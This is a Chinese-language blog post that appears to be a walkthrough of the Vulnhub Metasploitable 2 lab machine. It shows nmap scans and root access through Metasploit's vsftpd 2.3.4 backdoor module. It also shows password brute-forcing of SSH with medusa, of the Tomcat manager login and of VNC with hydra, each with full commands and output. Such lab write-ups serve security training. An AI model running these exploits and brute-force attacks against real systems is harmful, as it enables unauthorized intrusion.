---
layout: config.default_layout
title: Vulnhub-Metasploitable 2
date: 2025-04-02 15:36:41
updated: 2025-04-02 07:29:28
comments: true
tags: [Vulnhub]
categories: 靶机
---

# Metasploitable 2

> https://www.vulnhub.com/entry/metasploitable-2,29/
> 

## 前期踩点

```
⚡ root@kali  ~/Desktop/test/metasploit2  nmap -sP 192.168.111.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-10 20:49 EDT
Nmap scan report for 192.168.111.1
Host is up (0.00035s latency).
MAC Address: 00:50:56:C0:00:08 (VMware)
Nmap scan report for 192.168.111.2
Host is up (0.00038s latency).
MAC Address: 00:50:56:FB:CA:45 (VMware)
Nmap scan report for 192.168.111.171
Host is up (0.000072s latency).
MAC Address: 00:0C:29:27:A1:FB (VMware)
Nmap scan report for 192.168.111.254
Host is up (0.00024s latency).
MAC Address: 00:50:56:F7:38:74 (VMware)
```

`windows`靶机

```
⚡ root@kali  ~/Desktop/test/metasploit2  nmap -sT -min-rate 10000 -p-  192.168.111.171
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-10 20:49 EDT
Nmap scan report for 192.168.111.171
Host is up (0.0014s latency).
Not shown: 65505 closed tcp ports (conn-refused)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
23/tcp    open  telnet
25/tcp    open  smtp
53/tcp    open  domain
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
512/tcp   open  exec
513/tcp   open  login
514/tcp   open  shell
1099/tcp  open  rmiregistry
1524/tcp  open  ingreslock
2049/tcp  open  nfs
2121/tcp  open  ccproxy-ftp
3306/tcp  open  mysql
3632/tcp  open  distccd
5432/tcp  open  postgresql
5900/tcp  open  vnc
6000/tcp  open  X11
6667/tcp  open  irc
6697/tcp  open  ircs-u
8009/tcp  open  ajp13
8180/tcp  open  unknown
8787/tcp  open  msgsrvr
34043/tcp open  unknown
43178/tcp open  unknown
47030/tcp open  unknown
51460/tcp open  unknown
MAC Address: 00:0C:29:27:A1:FB (VMware)
```

```
⚡ root@kali  ~/Desktop/test/metasploit2  nmap -sT -A -T4 -O -p 21,22,23,80,445,139 192.168.111.171
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-10 20:51 EDT
Nmap scan report for 192.168.111.171
Host is up (0.00066s latency).

PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.111.162
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey:
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)                                          
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)                                          
23/tcp  open  telnet      Linux telnetd
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)                                           
|_http-server-header: Apache/2.2.8 (Ubuntu) DAV/2
|_http-title: Metasploitable2 - Linux
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                   
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)                               
MAC Address: 00:0C:29:27:A1:FB (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port   
Device type: general purpose
Running: Linux 2.6.X   
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel                                          

Host script results:                                                                                    
|_smb2-time: Protocol negotiation failed (SMB2)                                                         
| smb-security-mode:                                                                                                                                                                                            
|   account_used: guest                                                                                 
|   authentication_level: user      
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)                                                  
|_clock-skew: mean: 2h00m02s, deviation: 2h49m43s, median: 1s                                           
|_nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)       
| smb-os-discovery:                                                                                     
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: metasploitable
|   NetBIOS computer name: 
|   Domain name: localdomain       
|   FQDN: metasploitable.localdomain
|_  System time: 2025-03-10T20:51:24-04:00
                                                    
TRACEROUTE                              
HOP RTT     ADDRESS                    
1   0.66 ms 192.168.111.171               
                                                    
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .   
Nmap done: 1 IP address (1 host up) scanned in 27.34 seconds          
```

## FTP

版本`vsftpd 2.3.4` 判断存在笑脸漏洞，直接就`ROOT`了

```bash
msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use 1
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.168.111.171
rhosts => 192.168.111.171
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 192.168.111.171:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.111.171:21 - USER: 331 Please specify the password.
[+] 192.168.111.171:21 - Backdoor service has been spawned, handling...
[+] 192.168.111.171:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.111.162:39087 -> 192.168.111.171:6200) at 2025-03-10 20:56:35 -0400

id
uid=0(root) gid=0(root)
```

## SSH 爆破

```bash
 ⚡ root@kali  ~/Desktop/test/metasploit2  medusa -h 192.168.111.171 -M ssh -u root -P /usr/share/wordlists/rockyou.txt -t 12 -f               
Medusa v2.2 [http://www.foofus.net] (C) JoMo-Kun / Foofus Networks <jmk@foofus.net>

ERROR: ssh.mod: Failed establishing SSH session (1/4): Host: 192.168.111.171 User: root Pass: abc123
ERROR: ssh.mod: Failed establishing SSH session (1/4): Host: 192.168.111.171 User: root Pass: 12345678
ACCOUNT CHECK: [ssh] Host: 192.168.111.171 (1 of 1, 0 complete) User: root (1 of 1, 0 complete) Password: root (1 of 14344393 complete)
ACCOUNT FOUND: [ssh] Host: 192.168.111.171 User: root Password: root [SUCCESS]
ACCOUNT CHECK: [ssh] Host: 192.168.111.171 (1 of 1, 0 complete) User: root (1 of 1, 1 complete) Password: msfadmin (2 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.111.171 (1 of 1, 0 complete) User: root (1 of 1, 1 complete) Password: 123456 (3 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.111.171 (1 of 1, 0 complete) User: root (1 of 1, 1 complete) Password: 12345 (4 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.111.171 (1 of 1, 0 complete) User: root (1 of 1, 1 complete) Password: princess (5 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.111.171 (1 of 1, 0 complete) User: root (1 of 1, 1 complete) Password: password (6 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.111.171 (1 of 1, 0 complete) User: root (1 of 1, 1 complete) Password: rockyou (7 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.111.171 (1 of 1, 0 complete) User: root (1 of 1, 1 complete) Password: 123456789 (8 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.111.171 (1 of 1, 0 complete) User: root (1 of 1, 1 complete) Password: iloveyou (9 of 14344393 complete)
ACCOUNT CHECK: [ssh] Host: 192.168.111.171 (1 of 1, 0 complete) User: root (1 of 1, 1 complete) Password: 1234567 (10 of 14344393 complete)
ERROR: ssh.mod: Failed establishing SSH session (2/4): Host: 192.168.111.171 User: root Pass: 12345678
ERROR: ssh.mod: Failed establishing SSH session (2/4): Host: 192.168.111.171 User: root Pass: abc123
ERROR: ssh.mod: Failed establishing SSH session (3/4): Host: 192.168.111.171 User: root Pass: abc123
ERROR: ssh.mod: Failed establishing SSH session (3/4): Host: 192.168.111.171 User: root Pass: 12345678
ERROR: ssh.mod: Failed establishing SSH session (4/4): Host: 192.168.111.171 User: root Pass: abc123
NOTICE: [ssh] Host: 192.168.111.171 - Login thread (11) prematurely ended. The current number of parallel login threads may exceed what this service can reasonably handle. The total number of threads for this host will be decreased.
NOTICE: [ssh] Host: 192.168.111.171 User: root Password: abc123 - The noted credentials have been added to the end of the queue for testing.
ERROR: ssh.mod: Failed establishing SSH session (4/4): Host: 192.168.111.171 User: root Pass: 12345678
ERROR: ssh.mod: Failed establishing SSH session. The following credentials have been added to the missed queue for later testing: Host: 192.168.111.171 User: root Pass: abc123
NOTICE: [ssh] Host: 192.168.111.171 - Login thread (9) prematurely ended. The current number of parallel login threads may exceed what this service can reasonably handle. The total number of threads for this host will be decreased.
NOTICE: [ssh] Host: 192.168.111.171 User: root Password: 12345678 - The noted credentials have been added to the end of the queue for testing.
ERROR: ssh.mod: Failed establishing SSH session. The following credentials have been added to the missed queue for later testing: Host: 192.168.111.171 User: root Pass: 12345678
```

## Tomcat 后台爆破

```
msf6 auxiliary(scanner/telnet/telnet_version) > search tomcat_mgr

Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  exploit/multi/http/tomcat_mgr_deploy     2009-11-09       excellent  Yes    Apache Tomcat Manager Application Deployer Authenticated Code Execution
   1    \_ target: Automatic                   .                .          .      .
   2    \_ target: Java Universal              .                .          .      .
   3    \_ target: Windows Universal           .                .          .      .
   4    \_ target: Linux x86                   .                .          .      .
   5  exploit/multi/http/tomcat_mgr_upload     2009-11-09       excellent  Yes    Apache Tomcat Manager Authenticated Upload Code Execution
   6    \_ target: Java Universal              .                .          .      .
   7    \_ target: Windows Universal           .                .          .      .
   8    \_ target: Linux x86                   .                .          .      .
   9  auxiliary/scanner/http/tomcat_mgr_login  .                normal     No     Tomcat Application Manager Login Utility

Interact with a module by name or index. For example info 9, use 9 or use auxiliary/scanner/http/tomcat_mgr_login

msf6 auxiliary(scanner/telnet/telnet_version) > use 9
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rhosts 192.168.111.171
rhosts => 192.168.111.171
msf6 auxiliary(scanner/http/tomcat_mgr_login) > set rport 8180
rport => 8180

[+] 192.168.111.171:8180 - Login Successful: tomcat:tomcat                                                                                                                                                      

```

## VNC 爆破

```bash
 ⚡ root@kali  ~/Desktop/test/test/sec_tools/redis-over-gopher  hydra -P /usr/share/wordlists/rockyou.txt -Vv -t 12 192.168.111.171 vnc
[ATTEMPT] target 192.168.111.171 - login "" - pass "monkey" - 16 of 14344401 [child 4] (0/0)                                                                                                                    
[5900][vnc] host: 192.168.111.171   password: password                                                                                                                                                          
[STATUS] attack finished for 192.168.111.171 (valid pair found)                                         
1 of 1 target successfully completed, 1 valid password found                                                                                                                                                    
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-10 23:07:32 
```